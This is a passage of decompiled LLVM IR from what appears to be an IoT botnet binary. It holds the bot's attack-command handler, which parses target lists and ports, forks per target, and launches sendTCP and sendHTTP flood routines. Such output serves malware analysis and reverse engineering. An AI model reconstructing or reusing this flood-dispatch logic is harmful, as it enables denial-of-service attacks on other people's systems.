  %v1_804ee2d = call i32 @atol(i32 %v2_804ee27)
  %v12_804ee32 = ptrtoint i32* %stack_var_-364 to i32
  %v5_804ee35 = icmp ne i32 %v1_804ee2d, -1
  store i1 %v5_804ee35, i1* %cf.global-to-local, align 1
  %v10_804ee35 = icmp eq i32 %v1_804ee2d, -1
  br i1 %v10_804ee35, label %dec_label_pc_804eec5, label %dec_label_pc_804ee3e

dec_label_pc_804ee3e:                             ; preds = %dec_label_pc_804ee21
  %v1_804ee41 = add i32 %tmp162, 8
  %v1_804ee44 = inttoptr i32 %v1_804ee41 to i32*
  %v2_804ee44 = load i32, i32* %v1_804ee44, align 4
  %v5_804ee46 = icmp ult i32* %stack_var_-364, inttoptr (i32 12 to i32*)
  store i1 %v5_804ee46, i1* %cf.global-to-local, align 1
  %v1_804ee4a = call i32 @atol(i32 %v2_804ee44)
  %v5_804ee52 = icmp ne i32 %v1_804ee4a, -1
  store i1 %v5_804ee52, i1* %cf.global-to-local, align 1
  %v10_804ee52 = icmp eq i32 %v1_804ee4a, -1
  br i1 %v10_804ee52, label %dec_label_pc_804eec5, label %dec_label_pc_804ee57

dec_label_pc_804ee57:                             ; preds = %dec_label_pc_804ee3e
  %v1_804ee5a = add i32 %tmp162, 16
  %v1_804ee5d = inttoptr i32 %v1_804ee5a to i32*
  %v2_804ee5d = load i32, i32* %v1_804ee5d, align 4
  store i1 %v5_804ee46, i1* %cf.global-to-local, align 1
  %v1_804ee63 = call i32 @atol(i32 %v2_804ee5d)
  %v5_804ee6b = icmp ne i32 %v1_804ee63, -1
  store i1 %v5_804ee6b, i1* %cf.global-to-local, align 1
  %v10_804ee6b = icmp eq i32 %v1_804ee63, -1
  br i1 %v10_804ee6b, label %dec_label_pc_804eec5, label %dec_label_pc_804ee70

dec_label_pc_804ee70:                             ; preds = %dec_label_pc_804ee57
  %v2_804ee76 = load i32, i32* %v1_804ee5d, align 4
  store i1 %v5_804ee46, i1* %cf.global-to-local, align 1
  %v1_804ee7c = call i32 @atol(i32 %v2_804ee76)
  %v1_804ee84 = add i32 %v1_804ee7c, -32
  %v2_804ee84 = icmp ult i32 %v1_804ee7c, 32
  %v3_804ee84 = sub i32 31, %v1_804ee7c
  %v4_804ee84 = and i32 %v3_804ee84, %v1_804ee7c
  %v5_804ee84 = icmp slt i32 %v4_804ee84, 0
  store i1 %v2_804ee84, i1* %cf.global-to-local, align 1
  %v6_804ee84 = icmp eq i32 %v1_804ee84, 0
  %v7_804ee84 = icmp slt i32 %v1_804ee84, 0
  %v3_804ee87 = icmp eq i1 %v7_804ee84, %v5_804ee84
  %v4_804ee87 = icmp eq i1 %v6_804ee84, false
  %v5_804ee87 = and i1 %v4_804ee87, %v3_804ee87
  br i1 %v5_804ee87, label %dec_label_pc_804eec5, label %dec_label_pc_804ee89

dec_label_pc_804ee89:                             ; preds = %dec_label_pc_804ee70
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804ee8d = icmp sgt i32 %tmp134, 6
  br i1 %v7_804ee8d, label %dec_label_pc_804ee8f, label %dec_label_pc_804eea7.thread

dec_label_pc_804eea7.thread:                      ; preds = %dec_label_pc_804ee89
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eee0

dec_label_pc_804ee8f:                             ; preds = %dec_label_pc_804ee89
  %v1_804ee92 = add i32 %tmp162, 24
  %v1_804ee95 = inttoptr i32 %v1_804ee92 to i32*
  %v2_804ee95 = load i32, i32* %v1_804ee95, align 4
  store i1 %v5_804ee46, i1* %cf.global-to-local, align 1
  %v1_804ee9b = call i32 @atol(i32 %v2_804ee95)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804eea3 = icmp slt i32 %v1_804ee9b, 0
  br i1 %v2_804eea3, label %dec_label_pc_804eec5, label %dec_label_pc_804eea7

dec_label_pc_804eea7:                             ; preds = %dec_label_pc_804ee8f
  %v8_804eea7 = icmp ult i32 %tmp134, 8
  store i1 %v8_804eea7, i1* %cf.global-to-local, align 1
  %v12_804eea7 = icmp eq i32 %tmp134, 8
  %v1_804eeab = icmp eq i1 %v12_804eea7, false
  br i1 %v1_804eeab, label %dec_label_pc_804eee0, label %dec_label_pc_804eead

dec_label_pc_804eead:                             ; preds = %dec_label_pc_804eea7
  %v1_804eeb0 = add i32 %tmp162, 28
  %v1_804eeb3 = inttoptr i32 %v1_804eeb0 to i32*
  %v2_804eeb3 = load i32, i32* %v1_804eeb3, align 4
  store i1 %v5_804ee46, i1* %cf.global-to-local, align 1
  %v1_804eeb9 = call i32 @atol(i32 %v2_804eeb3)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp187 = icmp slt i32 %v1_804eeb9, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_804eee0, label %dec_label_pc_804eec5

dec_label_pc_804eec5:                             ; preds = %dec_label_pc_804ee17.dec_label_pc_804eec5_crit_edge, %dec_label_pc_804eead, %dec_label_pc_804ee8f, %dec_label_pc_804ee70, %dec_label_pc_804ee57, %dec_label_pc_804ee3e, %dec_label_pc_804ee21
  %v0_804eeca = phi i32 [ %v0_804eeca.pre, %dec_label_pc_804ee17.dec_label_pc_804eec5_crit_edge ], [ %v12_804ee32, %dec_label_pc_804eead ], [ %v12_804ee32, %dec_label_pc_804ee8f ], [ %v12_804ee32, %dec_label_pc_804ee70 ], [ %v12_804ee32, %dec_label_pc_804ee57 ], [ %v12_804ee32, %dec_label_pc_804ee3e ], [ %v12_804ee32, %dec_label_pc_804ee21 ]
  %v0_804eec5 = load i32, i32* @global_var_805b540.20, align 64
  %v5_804eeca = icmp ult i32 %v0_804eeca, 8
  store i1 %v5_804eeca, i1* %cf.global-to-local, align 1
  %v2_804eed3 = call i32 @sockprintf(i32 %v0_804eec5, i32 ptrtoint ([186 x i8]* @global_var_8058b38.426 to i32))
  %v0_804eed8 = load i32, i32* @esp, align 4
  %v2_804eed8 = icmp ugt i32 %v0_804eed8, -17
  store i1 %v2_804eed8, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f52b

dec_label_pc_804eee0:                             ; preds = %dec_label_pc_804eea7.thread, %dec_label_pc_804eead, %dec_label_pc_804eea7
  %v8_804eea7203 = phi i1 [ true, %dec_label_pc_804eea7.thread ], [ %v8_804eea7, %dec_label_pc_804eead ], [ %v8_804eea7, %dec_label_pc_804eea7 ]
  %v1_804eeab205 = phi i1 [ true, %dec_label_pc_804eea7.thread ], [ false, %dec_label_pc_804eead ], [ true, %dec_label_pc_804eea7 ]
  %v1_804eee3 = add i32 %tmp162, 4
  %v1_804eee6 = inttoptr i32 %v1_804eee3 to i32*
  %v2_804eee6 = load i32, i32* %v1_804eee6, align 4
  %v2_804eef1 = load i32, i32* %v1_804ee44, align 4
  store i1 %v5_804ee46, i1* %cf.global-to-local, align 1
  %v1_804eef7 = call i32 @atol(i32 %v2_804eef1)
  %v2_804ef08 = load i32, i32* %v1_804ee27, align 4
  store i1 %v5_804ee46, i1* %cf.global-to-local, align 1
  %v1_804ef0e = call i32 @atol(i32 %v2_804ef08)
  %v2_804ef1f = load i32, i32* %v1_804ee5d, align 4
  store i1 %v5_804ee46, i1* %cf.global-to-local, align 1
  %v1_804ef25 = call i32 @atol(i32 %v2_804ef1f)
  %v1_804ef33 = add i32 %tmp162, 20
  %v1_804ef36 = inttoptr i32 %v1_804ef33 to i32*
  %v2_804ef36 = load i32, i32* %v1_804ef36, align 4
  store i1 %v8_804eea7203, i1* %cf.global-to-local, align 1
  br i1 %v1_804eeab205, label %dec_label_pc_804ef67, label %dec_label_pc_804ef41

dec_label_pc_804ef41:                             ; preds = %dec_label_pc_804eee0
  %v1_804ef44 = add i32 %tmp162, 28
  %v1_804ef47 = inttoptr i32 %v1_804ef44 to i32*
  %v2_804ef47 = load i32, i32* %v1_804ef47, align 4
  store i1 %v5_804ee46, i1* %cf.global-to-local, align 1
  %v1_804ef4d = call i32 @atol(i32 %v2_804ef47)
  %v0_804ef52 = load i32, i32* @esp, align 4
  %v2_804ef52 = icmp ugt i32 %v0_804ef52, -17
  store i1 %v2_804ef52, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ef67

dec_label_pc_804ef67:                             ; preds = %dec_label_pc_804eee0, %dec_label_pc_804ef41
  %storemerge32 = phi i32 [ %v1_804ef4d, %dec_label_pc_804ef41 ], [ 10, %dec_label_pc_804eee0 ]
  store i32 %storemerge32, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_804ee8d, label %dec_label_pc_804ef76, label %dec_label_pc_804ef9c

dec_label_pc_804ef76:                             ; preds = %dec_label_pc_804ef67
  %v1_804ef79 = add i32 %tmp162, 24
  %v1_804ef7c = inttoptr i32 %v1_804ef79 to i32*
  %v2_804ef7c = load i32, i32* %v1_804ef7c, align 4
  store i1 %v5_804ee46, i1* %cf.global-to-local, align 1
  %v1_804ef82 = call i32 @atol(i32 %v2_804ef7c)
  %v0_804ef87 = load i32, i32* @esp, align 4
  %v2_804ef87 = icmp ugt i32 %v0_804ef87, -17
  store i1 %v2_804ef87, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ef9c

dec_label_pc_804ef9c:                             ; preds = %dec_label_pc_804ef67, %dec_label_pc_804ef76
  %storemerge31 = phi i32 [ %v1_804ef82, %dec_label_pc_804ef76 ], [ 0, %dec_label_pc_804ef67 ]
  store i32 %storemerge31, i32* @edi, align 4
  %v5_804efa8 = icmp ult i32* %stack_var_-364, inttoptr (i32 8 to i32*)
  store i1 %v5_804efa8, i1* %cf.global-to-local, align 1
  %v2_804efae = inttoptr i32 %v2_804eee6 to i8*
  %v3_804efae = call i32 @__GI_strchr(i8* %v2_804efae, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804efb6 = icmp eq i32 %v3_804efae, 0
  br i1 %v1_804efb6, label %dec_label_pc_804f023, label %dec_label_pc_804efba

dec_label_pc_804efba:                             ; preds = %dec_label_pc_804ef9c
  store i32 %v2_804eee6, i32* @eax, align 4
  store i1 %v5_804efa8, i1* %cf.global-to-local, align 1
  %v2_804efc6 = call i32 @__GI_strtok(i32 %v2_804eee6, i32 ptrtoint (i32* @global_var_8058771.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f01b214 = icmp eq i32 %v2_804efc6, 0
  %v1_804f01f215 = icmp eq i1 %v4_804f01b214, false
  br i1 %v1_804f01f215, label %dec_label_pc_804efd3, label %dec_label_pc_804f056

dec_label_pc_804efd3:                             ; preds = %dec_label_pc_804efba, %dec_label_pc_804f006
  %storemerge84216 = phi i32 [ %v2_804f010, %dec_label_pc_804f006 ], [ %v2_804efc6, %dec_label_pc_804efba ]
  %v0_804efd3 = call i32 @listFork()
  store i32 %v0_804efd3, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804efd8 = icmp eq i32 %v0_804efd3, 0
  %v1_804efda = icmp eq i1 %v1_804efd8, false
  %v0_804f006 = load i32, i32* @esp, align 4
  br i1 %v1_804efda, label %dec_label_pc_804f006, label %dec_label_pc_804efdc

dec_label_pc_804efdc:                             ; preds = %dec_label_pc_804efd3
  %v5_804efdc = icmp ult i32 %v0_804f006, 4
  store i1 %v5_804efdc, i1* %cf.global-to-local, align 1
  %v7_804eff4 = inttoptr i32 %v2_804ef36 to i8*
  %v8_804eff4 = call i32 @sendTCP(i32 %storemerge84216, i32 %v1_804eef7, i32 %v1_804ef0e, i32 %v1_804ef25, i8* %v7_804eff4, i32 %storemerge31, i32 %storemerge32)
  store i1 %v5_804ee46, i1* %cf.global-to-local, align 1
  %v1_804f001 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f006:                             ; preds = %dec_label_pc_804efd3
  %v5_804f006 = icmp ult i32 %v0_804f006, 8
  store i1 %v5_804f006, i1* %cf.global-to-local, align 1
  %v2_804f010 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8058771.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f01b = icmp eq i32 %v2_804f010, 0
  %v1_804f01f = icmp eq i1 %v4_804f01b, false
  br i1 %v1_804f01f, label %dec_label_pc_804efd3, label %dec_label_pc_804f056

dec_label_pc_804f023:                             ; preds = %dec_label_pc_804ef9c
  %v0_804f023 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f028 = icmp eq i32 %v0_804f023, 0
  %v1_804f02a = icmp eq i1 %v1_804f028, false
  br i1 %v1_804f02a, label %dec_label_pc_804f056, label %dec_label_pc_804f02c

dec_label_pc_804f02c:                             ; preds = %dec_label_pc_804f023
  %v0_804f02c = load i32, i32* @esp, align 4
  %v5_804f02c = icmp ult i32 %v0_804f02c, 4
  store i1 %v5_804f02c, i1* %cf.global-to-local, align 1
  %v7_804f044 = inttoptr i32 %v2_804ef36 to i8*
  %v8_804f044 = call i32 @sendTCP(i32 %v2_804eee6, i32 %v1_804eef7, i32 %v1_804ef0e, i32 %v1_804ef25, i8* %v7_804f044, i32 %storemerge31, i32 %storemerge32)
  store i1 %v5_804ee46, i1* %cf.global-to-local, align 1
  %v1_804f051 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f056:                             ; preds = %dec_label_pc_804efba, %dec_label_pc_804f006, %dec_label_pc_804f023, %dec_label_pc_804edcc
  %v2_804f059 = load i32, i32* %v1_804e755, align 4
  store i1 false, i1* @df, align 1
  %v4_804f076 = inttoptr i32 %v2_804f059 to i8*
  store i32 %v2_804f059, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8058bf2.427 to i32), i32* @edi, align 4
  %v7_804f088 = call i32 @_strncmp(i8* %v4_804f076, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058bf2.427, i32 0, i32 0), i32 5)
  %v8_804f088 = urem i32 %v7_804f088, 2
  %v9_804f088 = icmp eq i32 %v8_804f088, 0
  %v0_804f08a = load i1, i1* %cf.global-to-local, align 1
  %v2_804f08a = or i1 %v0_804f08a, %v9_804f088
  %v3_804f08a = zext i1 %v2_804f08a to i32
  %v4_804f08a = load i32, i32* @edx, align 4
  %v5_804f08a = and i32 %v4_804f08a, -256
  %v6_804f08a = or i32 %v3_804f08a, %v5_804f08a
  %v7_804f08a = xor i32 %v6_804f08a, 1
  store i32 %v7_804f08a, i32* @edx, align 4
  %v3_804f090 = and i32 %v7_804f088, -256
  %v1_804f092 = trunc i32 %v7_804f08a to i8
  %v3_804f092 = zext i1 %v0_804f08a to i8
  %v4_804f092 = sub nsw i8 %v1_804f092, %v3_804f092
  %v15_804f092 = icmp eq i8 %v4_804f092, 0
  %v20_804f092 = zext i8 %v4_804f092 to i32
  %v23_804f092 = or i32 %v20_804f092, %v3_804f090
  store i32 %v23_804f092, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f09b = icmp eq i1 %v15_804f092, false
  br i1 %v1_804f09b, label %dec_label_pc_804f222, label %dec_label_pc_804f0a1

dec_label_pc_804f0a1:                             ; preds = %dec_label_pc_804f056
  %v2_804f096 = sext i8 %v4_804f092 to i32
  %v9_804f0a1 = icmp ult i32 %tmp134, 5
  store i1 %v9_804f0a1, i1* %cf.global-to-local, align 1
  %v7_804f0a5 = icmp sgt i32 %tmp134, 5
  br i1 %v7_804f0a5, label %dec_label_pc_804f0ab, label %dec_label_pc_804f52b

dec_label_pc_804f0ab:                             ; preds = %dec_label_pc_804f0a1
  %v1_804f0ae = add i32 %tmp162, 4
  %v1_804f0b1 = inttoptr i32 %v1_804f0ae to i32*
  %v2_804f0b1 = load i32, i32* %v1_804f0b1, align 4
  %v0_804f0b3 = load i32, i32* @esp, align 4
  %v5_804f0b3 = icmp ult i32 %v0_804f0b3, 8
  store i1 %v5_804f0b3, i1* %cf.global-to-local, align 1
  %v2_804f0b9 = inttoptr i32 %v2_804f0b1 to i8*
  %v3_804f0b9 = call i32 @__GI_strchr(i8* %v2_804f0b9, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f0c1 = icmp eq i32 %v3_804f0b9, 0
  br i1 %v1_804f0c1, label %dec_label_pc_804f196, label %dec_label_pc_804f0c9

dec_label_pc_804f0c9:                             ; preds = %dec_label_pc_804f0ab
  %v2_804f0cf = load i32, i32* %v1_804f0b1, align 4
  store i32 %v2_804f0cf, i32* @eax, align 4
  %v5_804f0d1 = icmp ult i32* %stack_var_-364, inttoptr (i32 8 to i32*)
  store i1 %v5_804f0d1, i1* %cf.global-to-local, align 1
  %v2_804f0da = call i32 @__GI_strtok(i32 %v2_804f0cf, i32 ptrtoint (i32* @global_var_8058771.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f187212 = icmp eq i32 %v2_804f0da, 0
  %v1_804f18b213 = icmp eq i1 %v4_804f187212, false
  br i1 %v1_804f18b213, label %dec_label_pc_804f0ea, label %dec_label_pc_804f222

dec_label_pc_804f0ea:                             ; preds = %dec_label_pc_804f0c9, %dec_label_pc_804f172
  %v0_804f0ea = call i32 @listFork()
  store i32 %v0_804f0ea, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f0ef = icmp eq i32 %v0_804f0ea, 0
  %v1_804f0f1 = icmp eq i1 %v1_804f0ef, false
  br i1 %v1_804f0f1, label %dec_label_pc_804f172, label %dec_label_pc_804f0f3

dec_label_pc_804f0f3:                             ; preds = %dec_label_pc_804f0ea
  %v1_804f0f6 = add i32 %tmp162, 24
  %v1_804f0f9 = inttoptr i32 %v1_804f0f6 to i32*
  %v2_804f0f9 = load i32, i32* %v1_804f0f9, align 4
  %v0_804f0fb = load i32, i32* @esp, align 4
  %v5_804f0fb = icmp ult i32 %v0_804f0fb, 12
  store i1 %v5_804f0fb, i1* %cf.global-to-local, align 1
  %v1_804f0ff = call i32 @atol(i32 %v2_804f0f9)
  store i32 %v1_804f0ff, i32* @ebx, align 4
  %v1_804f10c = add i32 %tmp162, 20
  %v1_804f10f = inttoptr i32 %v1_804f10c to i32*
  %v2_804f10f = load i32, i32* %v1_804f10f, align 4
  %v5_804f111 = icmp ult i32* %stack_var_-364, inttoptr (i32 12 to i32*)
  store i1 %v5_804f111, i1* %cf.global-to-local, align 1
  %v1_804f115 = call i32 @atol(i32 %v2_804f10f)
  store i32 %v1_804f115, i32* @esi, align 4
  %v1_804f122 = add i32 %tmp162, 16
  %v1_804f125 = inttoptr i32 %v1_804f122 to i32*
  %v2_804f125 = load i32, i32* %v1_804f125, align 4
  store i32 %v2_804f125, i32* @edi, align 4
  %v1_804f12c = add i32 %tmp162, 12
  %v1_804f12f = inttoptr i32 %v1_804f12c to i32*
  %v2_804f12f = load i32, i32* %v1_804f12f, align 4
  store i1 %v5_804f111, i1* %cf.global-to-local, align 1
  %v1_804f135 = call i32 @atol(i32 %v2_804f12f)
  %v1_804f148 = add i32 %tmp162, 8
  %v1_804f14b = inttoptr i32 %v1_804f148 to i32*
  %v2_804f14b = load i32, i32* %v1_804f14b, align 4
  store i32 %v2_804f14b, i32* %edx.global-to-local, align 4
  %v2_804f155 = load i32, i32* %v1_804f0b1, align 4
  store i1 %v5_804f0d1, i1* %cf.global-to-local, align 1
  %v0_804f15a = load i32, i32* @ebx, align 4
  %v0_804f15b = load i32, i32* @esi, align 4
  %v0_804f15c = load i32, i32* @edi, align 4
  %v6_804f160 = trunc i32 %v1_804f135 to i16
  %v7_804f160 = call i32 @sendHTTP(i32 %v2_804f155, i32 %v2_804f14b, i16 %v6_804f160, i32 %v0_804f15c, i32 %v0_804f15b, i32 %v0_804f15a)
  store i1 %v5_804f111, i1* %cf.global-to-local, align 1
  %v1_804f16d = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f172:                             ; preds = %dec_label_pc_804f0ea
  %v0_804f172 = load i32, i32* @esp, align 4
  %v5_804f172 = icmp ult i32 %v0_804f172, 8
  store i1 %v5_804f172, i1* %cf.global-to-local, align 1
  %v2_804f17c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8058771.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f187 = icmp eq i32 %v2_804f17c, 0
  %v1_804f18b = icmp eq i1 %v4_804f187, false
  br i1 %v1_804f18b, label %dec_label_pc_804f0ea, label %dec_label_pc_804f222

dec_label_pc_804f196:                             ; preds = %dec_label_pc_804f0ab
  %v0_804f196 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f19b = icmp eq i32 %v0_804f196, 0
  %v1_804f19d = icmp eq i1 %v1_804f19b, false
  br i1 %v1_804f19d, label %dec_label_pc_804f52b, label %dec_label_pc_804f1a3

dec_label_pc_804f1a3:                             ; preds = %dec_label_pc_804f196
  %v1_804f1a6 = add i32 %tmp162, 24
  %v1_804f1a9 = inttoptr i32 %v1_804f1a6 to i32*
  %v2_804f1a9 = load i32, i32* %v1_804f1a9, align 4
  %v0_804f1ab = load i32, i32* @esp, align 4
  %v5_804f1ab = icmp ult i32 %v0_804f1ab, 12
  store i1 %v5_804f1ab, i1* %cf.global-to-local, align 1
  %v1_804f1af = call i32 @atol(i32 %v2_804f1a9)
  store i32 %v1_804f1af, i32* @ebx, align 4
  %v1_804f1bc = add i32 %tmp162, 20
  %v1_804f1bf = inttoptr i32 %v1_804f1bc to i32*
  %v2_804f1bf = load i32, i32* %v1_804f1bf, align 4
  %v5_804f1c1 = icmp ult i32* %stack_var_-364, inttoptr (i32 12 to i32*)
  store i1 %v5_804f1c1, i1* %cf.global-to-local, align 1
  %v1_804f1c5 = call i32 @atol(i32 %v2_804f1bf)
  store i32 %v1_804f1c5, i32* @esi, align 4
  %v1_804f1d2 = add i32 %tmp162, 16
  %v1_804f1d5 = inttoptr i32 %v1_804f1d2 to i32*
  %v2_804f1d5 = load i32, i32* %v1_804f1d5, align 4
  store i32 %v2_804f1d5, i32* @edi, align 4
  %v1_804f1dc = add i32 %tmp162, 12
  %v1_804f1df = inttoptr i32 %v1_804f1dc to i32*
  %v2_804f1df = load i32, i32* %v1_804f1df, align 4
  store i1 %v5_804f1c1, i1* %cf.global-to-local, align 1
  %v1_804f1e5 = call i32 @atol(i32 %v2_804f1df)
  %v1_804f1f8 = add i32 %tmp162, 8
  %v1_804f1fb = inttoptr i32 %v1_804f1f8 to i32*
  %v2_804f1fb = load i32, i32* %v1_804f1fb, align 4
  store i32 %v2_804f1fb, i32* %edx.global-to-local, align 4
  %v2_804f205 = load i32, i32* %v1_804f0b1, align 4
  %v5_804f207 = icmp ult i32* %stack_var_-364, inttoptr (i32 8 to i32*)
  store i1 %v5_804f207, i1* %cf.global-to-local, align 1
  %v0_804f20a = load i32, i32* @ebx, align 4
  %v0_804f20b = load i32, i32* @esi, align 4
  %v0_804f20c = load i32, i32* @edi, align 4
  %v6_804f210 = trunc i32 %v1_804f1e5 to i16
  %v7_804f210 = call i32 @sendHTTP(i32 %v2_804f205, i32 %v2_804f1fb, i16 %v6_804f210, i32 %v0_804f20c, i32 %v0_804f20b, i32 %v0_804f20a)
  store i1 %v5_804f1c1, i1* %cf.global-to-local, align 1
  %v1_804f21d = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f222:                             ; preds = %dec_label_pc_804f0c9, %dec_label_pc_804f172, %dec_label_pc_804f056
  %v2_804f225 = load i32, i32* %v1_804e755, align 4
  store i1 false, i1* @df, align 1
  %v4_804f242 = inttoptr i32 %v2_804f225 to i8*
  store i32 %v2_804f225, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8058bf7.428 to i32), i32* @edi, align 4
  %v7_804f254 = call i32 @_strncmp(i8* %v4_804f242, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058bf7.428, i32 0, i32 0), i32 4)
  %v8_804f254 = urem i32 %v7_804f254, 2
  %v9_804f254 = icmp eq i32 %v8_804f254, 0
  %v0_804f256 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f256 = or i1 %v0_804f256, %v9_804f254
  %v3_804f256 = zext i1 %v2_804f256 to i32
  %v4_804f256 = load i32, i32* @edx, align 4
  %v5_804f256 = and i32 %v4_804f256, -256
  %v6_804f256 = or i32 %v3_804f256, %v5_804f256
  %v7_804f256 = xor i32 %v6_804f256, 1
  store i32 %v7_804f256, i32* @edx, align 4
  %v1_804f25e = trunc i32 %v7_804f256 to i8
  %v3_804f25e = zext i1 %v0_804f256 to i8
  %v15_804f25e = icmp eq i8 %v1_804f25e, %v3_804f25e
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f267 = icmp eq i1 %v15_804f25e, false
  br i1 %v1_804f267, label %dec_label_pc_804f394, label %dec_label_pc_804f26d

dec_label_pc_804f26d:                             ; preds = %dec_label_pc_804f222
  %v9_804f26d = icmp ult i32 %tmp134, 3
  store i1 %v9_804f26d, i1* %cf.global-to-local, align 1
  %v7_804f271 = icmp sgt i32 %tmp134, 3
  br i1 %v7_804f271, label %dec_label_pc_804f273, label %dec_label_pc_804f26d.dec_label_pc_804f2a3_crit_edge

dec_label_pc_804f26d.dec_label_pc_804f2a3_crit_edge: ; preds = %dec_label_pc_804f26d
  %v0_804f2a8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f2a3

dec_label_pc_804f273:                             ; preds = %dec_label_pc_804f26d
  %v1_804f276 = add i32 %tmp162, 8
  %v1_804f279 = inttoptr i32 %v1_804f276 to i32*
  %v2_804f279 = load i32, i32* %v1_804f279, align 4
  %v0_804f27b = load i32, i32* @esp, align 4
  %v5_804f27b = icmp ult i32 %v0_804f27b, 12
  store i1 %v5_804f27b, i1* %cf.global-to-local, align 1
  store i32 %v2_804f279, i32* %stack_var_-348, align 4
  %v1_804f27f = call i32 @atol(i32 %v2_804f279)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp189 = icmp slt i32 %v1_804f27f, 1
  br i1 %tmp189, label %dec_label_pc_804f2a3, label %dec_label_pc_804f28b

dec_label_pc_804f28b:                             ; preds = %dec_label_pc_804f273
  %v1_804f28e = add i32 %tmp162, 12
  %v1_804f291 = inttoptr i32 %v1_804f28e to i32*
  %v2_804f291 = load i32, i32* %v1_804f291, align 4
  %v5_804f293 = icmp ult i32* %stack_var_-332, inttoptr (i32 12 to i32*)
  store i1 %v5_804f293, i1* %cf.global-to-local, align 1
  store i32 %v2_804f291, i32* %stack_var_-348, align 4
  %v1_804f297 = call i32 @atol(i32 %v2_804f291)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp190 = icmp slt i32 %v1_804f297, 1
  %tmp191 = icmp eq i1 %tmp190, false
  br i1 %tmp191, label %dec_label_pc_804f2be, label %dec_label_pc_804f2a3

dec_label_pc_804f2a3:                             ; preds = %dec_label_pc_804f26d.dec_label_pc_804f2a3_crit_edge, %dec_label_pc_804f28b, %dec_label_pc_804f273
  %v0_804f2a8 = phi i32 [ %v0_804f2a8.pre, %dec_label_pc_804f26d.dec_label_pc_804f2a3_crit_edge ], [ %v15_804e74c, %dec_label_pc_804f28b ], [ %v15_804e74c, %dec_label_pc_804f273 ]
  %v0_804f2a3 = load i32, i32* @global_var_805b540.20, align 64
  %v5_804f2a8 = icmp ult i32 %v0_804f2a8, 8
  store i1 %v5_804f2a8, i1* %cf.global-to-local, align 1
  store i32 %v0_804f2a3, i32* %stack_var_-348, align 4
  %v2_804f2b1 = call i32 @sockprintf(i32 %v0_804f2a3, i32 ptrtoint ([27 x i8]* @global_var_8058bfb.429 to i32))
  %v0_804f2b6 = load i32, i32* @esp, align 4
  %v2_804f2b6 = icmp ugt i32 %v0_804f2b6, -17
  store i1 %v2_804f2b6, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f52b

dec_label_pc_804f2be:                             ; preds = %dec_label_pc_804f28b
  %v1_804f2c1 = add i32 %tmp162, 4
  %v1_804f2c4 = inttoptr i32 %v1_804f2c1 to i32*
  %v2_804f2c4 = load i32, i32* %v1_804f2c4, align 4
  %v2_804f2cf = load i32, i32* %v1_804f279, align 4
  store i1 %v5_804f293, i1* %cf.global-to-local, align 1
  store i32 %v2_804f2cf, i32* %stack_var_-348, align 4
  %v1_804f2d5 = call i32 @atol(i32 %v2_804f2cf)
  %v2_804f2e6 = load i32, i32* %v1_804f291, align 4
  store i1 %v5_804f293, i1* %cf.global-to-local, align 1
  store i32 %v2_804f2e6, i32* %stack_var_-348, align 4
  %v1_804f2ec = call i32 @atol(i32 %v2_804f2e6)
  %v5_804f2fa = icmp ult i32* %stack_var_-332, inttoptr (i32 8 to i32*)
  store i1 %v5_804f2fa, i1* %cf.global-to-local, align 1
  store i32 %v2_804f2c4, i32* %stack_var_-348, align 4
  %v2_804f300 = inttoptr i32 %v2_804f2c4 to i8*
  %v3_804f300 = call i32 @__GI_strchr(i8* %v2_804f300, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f308 = icmp eq i32 %v3_804f300, 0
  br i1 %v1_804f308, label %dec_label_pc_804f369, label %dec_label_pc_804f30c

dec_label_pc_804f30c:                             ; preds = %dec_label_pc_804f2be
  store i32 %v2_804f2c4, i32* @eax, align 4
  store i1 %v5_804f2fa, i1* %cf.global-to-local, align 1
  store i32 %v2_804f2c4, i32* %stack_var_-348, align 4
  %v2_804f318 = call i32 @__GI_strtok(i32 %v2_804f2c4, i32 ptrtoint (i32* @global_var_8058771.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f361209 = icmp eq i32 %v2_804f318, 0
  %v1_804f365210 = icmp eq i1 %v4_804f361209, false
  br i1 %v1_804f365210, label %dec_label_pc_804f325, label %dec_label_pc_804f394

dec_label_pc_804f325:                             ; preds = %dec_label_pc_804f30c, %dec_label_pc_804f34c
